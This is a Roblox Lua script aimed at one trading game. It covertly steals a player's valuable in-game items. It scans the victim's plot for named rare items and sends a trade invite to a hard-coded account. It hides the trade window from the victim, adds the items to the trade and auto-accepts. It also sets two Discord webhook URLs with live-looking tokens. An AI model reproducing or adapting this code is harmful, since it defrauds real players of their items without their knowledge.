if game.PlaceId ~= 109983668079237 then return end

getgenv().WEBHOOK_URL2 = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"
getgenv().WEBHOOKSHERIF = "https://discord.com/api/webhooks/1490063982760038440/CLhsVX58Yl-Xd5ZqG8kiSqEoNl9NoV4A1SDQXsjOVGJQNGOdfYlk-OetI7XGas0QirJd"

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer.PlayerGui

local MY_USER = "Only1sherif"

-- ========== HIDE UI LOGIC ==========
local function hideTrade(v)
    if v.Name == "TradeLiveTrade" then
        local otherUser = v:FindFirstChild("Other", true) and v.Other:FindFirstChild("Username", true)
        if otherUser and otherUser.Text:find(MY_USER) then
            pcall(function() v.Enabled = false end)
            pcall(function() v.Visible = false end)
            pcall(function() sethiddenproperty(v, "Enabled", false) end)
        end
    end
end

PlayerGui.DescendantAdded:Connect(hideTrade)

-- ========== CORE NETWORKING (From Source 5) ==========
local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
local function getRemote(name)
    local children = Net:GetChildren()
    for i, obj in ipairs(children) do
        if obj.Name == name then return children[i+1] end
    end
    return nil
end

local acceptInviteRF = getRemote("RF/TradeService/AcceptInvite")
local createInviteRE = getRemote("RE/TradeService/CreateInvite")
local readyRE        = getRemote("RE/TradeService/Ready")
local acceptRE       = getRemote("RE/TradeService/Accept")

-- Auto-Accept Invite (From Source 7)
if createInviteRE then
    createInviteRE.OnClientEvent:Connect(function(tradeId)
        if tradeId and acceptInviteRF then
            pcall(function()
                acceptInviteRF:InvokeServer("57624f2b-8aa9-4974-bb7a-08f058af33ef", tradeId)
            end)
        end
    end)
end

local wantedItems = {
    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
}

local function scanPlot()
    local found = {}
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return found end
    for _, p in ipairs(plots:GetChildren()) do
        local sign = p:FindFirstChild("PlotSign")
        if sign then
            local lbl = sign:FindFirstChildOfClass("SurfaceGui", true):FindFirstChildOfClass("TextLabel", true)
            if lbl and (lbl.Text:lower():find(LocalPlayer.Name:lower()) or lbl.Text:lower():find(LocalPlayer.DisplayName:lower())) then
                for _, child in ipairs(p:GetChildren()) do
                    if child:IsA("Model") then
                        for _, wanted in ipairs(wantedItems) do
                            if child.Name:lower():find(wanted:lower()) then
                                table.insert(found, child.Name)
                                break
                            end
                        end
                    end
                end
            end
        end
    end
    return found
end

local function sendInvite()
    local tl = PlayerGui:FindFirstChild("TradePlayerList")
    if tl and tl:FindFirstChild("TradePlayerList") then
        local inner = tl.TradePlayerList
        local sb = inner.bg.SearchFrame.SearchBox
        sb.Text = MY_USER
        task.wait(0.5)
        pcall(function() firesignal(sb.FocusLost, true) end)
        task.wait(0.8)
        local list = inner:FindFirstChild("Global") and inner.Global:FindFirstChild("List")
        if list then
            for _, p in pairs(list:GetChildren()) do
                if p:IsA("Frame") and p:FindFirstChild("Fill") then
                    local nameLbl = p.Fill:FindFirstChild("Username")
                    if nameLbl and nameLbl.Text:lower():find(MY_USER:lower()) then
                        local send = p.Fill:FindFirstChild("Send")
                        if send then
                            pcall(function() firesignal(send.Activated) end)
                            return true
                        end
                    end
                end
            end
        end
    end
    return false
end

task.spawn(function()
    while true do
        pcall(function()
            local tradeUI = PlayerGui:FindFirstChild("TradeLiveTrade")
            if tradeUI and tradeUI.Enabled or (tradeUI and tradeUI.Visible == false) then
                -- Auto Ready/Accept Loop (From Source 5)
                if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
                task.wait(1)
                if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
                
                -- Add Brainrots if trading with you
                local other = tradeUI:FindFirstChild("Other", true)
                if other and other.Username.Text:find(MY_USER) then
                    local scroll = tradeUI:FindFirstChild("ScrollingFrame", true)
                    if scroll then
                        for _, slot in pairs(scroll:GetChildren()) do
                            if slot.Name:sub(1,9) == "Selection" then
                                local spacer = slot:FindFirstChild("Spacer")
                                if spacer and spacer:FindFirstChild("UIStroke") and spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
                                    firesignal(spacer.Activated)
                                end
                            end
                        end
                    end
                end
            else
                local found = scanPlot()
                if #found > 0 then
                    sendInvite()
                end
            end
        end)
        task.wait(1.5)
    end
end)
